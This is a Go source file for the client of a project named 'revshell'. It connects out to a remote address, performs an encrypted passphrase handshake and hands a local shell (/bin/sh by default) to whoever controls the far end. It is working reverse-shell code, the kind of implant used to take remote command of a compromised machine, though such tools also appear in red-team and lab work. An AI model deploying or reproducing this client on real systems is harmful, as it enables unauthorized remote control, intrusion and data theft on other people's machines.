package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"

	"revshell/pkg/secureio"
	"revshell/pkg/terminal"
)

type clientOptions struct {
	addr       string
	passphrase string
	cipher     string
	shell      string
	prompt     string
	workdir    string
}

func main() {
	opts := parseFlags()

	conn, err := net.Dial("tcp", opts.addr)
	if err != nil {
		log.Fatalf("client: failed to connect to %s: %v", opts.addr, err)
	}
	defer conn.Close()

	reader, writer, err := secureio.Handshake(conn, false, opts.passphrase, opts.cipher)
	if err != nil {
		log.Fatalf("client: handshake failed: %v", err)
	}

	log.Printf("client: connected to %s using %s cipher", opts.addr, opts.cipher)

	sessionOpts := terminal.Options{Prompt: opts.prompt, Shell: opts.shell, InitialDir: opts.workdir}
	session, err := terminal.NewSession(reader, writer, sessionOpts)
	if err != nil {
		log.Fatalf("client: failed to create session: %v", err)
	}

	if err := session.Run(); err != nil && !errors.Is(err, io.EOF) {
		log.Printf("client: session ended with error: %v", err)
	}
}

func parseFlags() clientOptions {
	available := strings.Join(secureio.ListCipherSuites(), ", ")
	addr := flag.String("addr", "127.0.0.1:2222", "remote server address")
	pass := flag.String("pass", "", "shared passphrase used to derive encryption keys")
	cipherName := flag.String("cipher", "aes", fmt.Sprintf("cipher suite to use (%s)", available))
	shell := flag.String("shell", "/bin/sh", "shell executable used to run commands")
	prompt := flag.String("prompt", "", "prompt template forwarded to the remote shell (supports {{.USER}}, {{.HOST}}, {{.CWD}}, {{.BASENAME}})")
	workdir := flag.String("workdir", "", "initial working directory for new sessions")
	flag.Parse()

	if *pass == "" {
		fmt.Fprintln(os.Stderr, "client: passphrase must be provided via -pass")
		os.Exit(1)
	}

	return clientOptions{
		addr:       *addr,
		passphrase: *pass,
		cipher:     *cipherName,
		shell:      *shell,
		prompt:     *prompt,
		workdir:    *workdir,
	}
}
